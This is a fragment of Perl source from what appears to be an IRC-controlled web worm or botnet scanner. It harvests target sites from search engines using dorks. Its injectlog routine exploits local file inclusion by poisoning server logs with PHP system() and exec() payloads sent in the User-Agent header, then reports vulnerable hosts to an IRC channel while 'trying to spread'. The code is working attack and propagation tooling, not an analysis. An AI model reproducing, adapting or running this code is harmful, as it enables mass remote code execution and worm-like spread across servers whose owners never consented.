sub ask() {
    my @lst;
	my $pag = 1;
    my $key = $_[0];
    my $Go = "http://www.ask.com/web?q=".key($key)."&page=".$pag."&dm=all";
	my $Res=query($Go);
	if ($Res =~ //) { 
		$ban = 1;
	}	
	while ($Res =~ />Next/) {
		while ($Res =~ m/href="http:\/\/(.+?)" onmousedown=/g) {
            if ($1 !~ /ask\.com|cache/){		
				my $k=$1;
				my @grep=links($k);
				push(@lst,@grep);				
            }			
		}
		$pag += 1;
		$Go = "http://www.ask.com/web?q=".key($key)."&page=".$pag."&dm=all";
		$Res=query($Go);		
	}
return @lst;
}

sub yahoo() {
    my @lst;
	my $pag = 1;	
    my $key = $_[0];
    my $Go = "http://search.yahoo.com/search?p=".key($key)."&b=".$pag;
	my $Res=query($Go);
	if ($Res =~ /-- Viruses --/) { 
		$ban = 1;
	}
	while ($Res =~ /id="pg-next"/) {
		while ($Res =~ m/26u=(.*?)%26w=/g) {
            if ($1 !~ /yahoo/){		
				my $k=$1;
				my @grep=links($k);
				push(@lst,@grep);
            }			
		}
		$pag += 10;
		$Go = "http://search.yahoo.com/search?p=".key($key)."&b=".$pag;		
		$Res=query($Go);
	}
return @lst;	
}

sub injectlog() {
    my $host = $_[0];
	my $bug = $_[1];
	my $lfi = $_[2];
	my $comando = $_[3];
	my $php = "<?php system('$comando'); ?>";
	my $php2 = "<?php exec('$comando'); ?>";	
    my $req = HTTP::Request->new(GET => "http://".$host.$bug.$lfi);
    my $ua  = LWP::UserAgent->new();
    $ua->timeout(5);
	$ua->agent($php);
    my $response = $ua->request($req);
	if ($response->content =~ /$lfi_output/) { 
		print STDERR "http://".$host.$bug.$lfi."\n-------------------------------------------------\n";
		print STDERR $response->content."\n*************************************************\n*************************************************\n\n";
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8LFI15)(7@10Vulnerable15)4 http://".$host.$bug.$lfi."%00 10Trying to spread...");
		my $ua = LWP::UserAgent->new();
		$ua->timeout(5);
		$ua->agent($php2);
		my $response = $ua->request($req);
		foreach my $log (@logs)	{
		    my $req = HTTP::Request->new(GET => "http://".$host.$bug.$log."%00");
			my $ua  = LWP::UserAgent->new();
			$ua->timeout(5);
			$ua->agent("Mozilla/5.0");
			my $response = $ua->request($req);
		}
	}
}

sub links() {
	my @l;
	my $link = $_[0];
	my $host = $_[0];
	my $hdir = $_[0];
	$hdir =~ s/(.*)\/[^\/]*$/\1/;
	$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
	$host .= "/";
	$hdir .= "/";
	$host =~ s/\/\//\//g;
	$hdir =~ s/\/\//\//g;
	$link =~ s/\/\//\//g;
	push( @l, $link, $host, $hdir );
	return @l;
}

sub key() {
	my $dork = $_[0];
	$dork =~ s/ /\+/g;
	$dork =~ s/:/\%3A/g;
	$dork =~ s/\//\%2F/g;
	$dork =~ s/&/\%26/g;
	$dork =~ s/\"/\%22/g;
	$dork =~ s/,/\%2C/g;
	$dork =~ s/\\/\%5C/g;
	return $dork;
}

sub query($) {
	my $url = $_[0];
	$url =~ s/http:\/\///;
	my $host  = $url;
	my $query = $url;
	my $page  = "";
	$host  =~ s/href=\"?http:\/\///;
	$host  =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
	$query =~ s/$host//;
	if ( $query eq "" ) { $query = "/"; }
		eval {
			my $sock = IO::Socket::INET->new(PeerAddr => "$host", PeerPort => "80", Proto => "tcp") or return;
			print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
			my @r = <$sock>;
			$page = "@r";
			close($sock);
		};
	return $page;
}

sub calculate {
	my @calculate = ();
	my %visti = ();
	foreach my $element (@_) {
		$element =~ s/\/+/\//g;
		next if $visti{$element}++;
		push @calculate, $element;
	}
	return @calculate;
}

sub lnk_filter {
  my @unik = ();
  foreach my $url ( @_ ) {
    my $checkhost = 0;
    foreach my $b ( @badlink ) {
      if ($url =~ /$b/) { $checkhost = 1; }
    }
    if ($checkhost == 0) { push (@unik, $url); }
  }
  return @unik;
}

sub nick {
	return unless $#_ == 0;
	sendraw("NICK $_[0]");
}

sub notice {
	return unless $#_ == 1;
	sendraw("NOTICE $_[0] :$_[1]");
}
#5.2#
